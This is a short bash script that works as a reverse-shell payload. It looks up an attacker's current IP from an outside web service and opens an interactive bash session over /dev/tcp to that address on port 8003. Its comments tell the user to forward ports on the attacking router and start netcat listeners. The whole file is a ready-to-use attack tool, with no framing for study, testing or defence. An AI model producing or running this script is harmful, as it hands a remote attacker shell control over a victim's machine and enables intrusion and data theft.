#!/bin/bash

# Define the port which will be open on the attacking IP to receive the connection
attackerport=8003

# Get the attacking current IP
attackerip=$(wget -qO- http://eudomus.webfactional.com/currentip/)

# Open a reverse tunnel to the attacker
bash -i >& /dev/tcp/$attackerip/$attackerport 0>&1

# INSTRUCTIONS:
# 1. Open port 8001-8079 on the attacking router and forward it to your device's local IP on the same port
# 2. Listen on your computer using NetCat running:
#    nc -lvv 0.0.0.0 -p 8001 (Android)
#    nc -nlvv -p 8002 (Server)
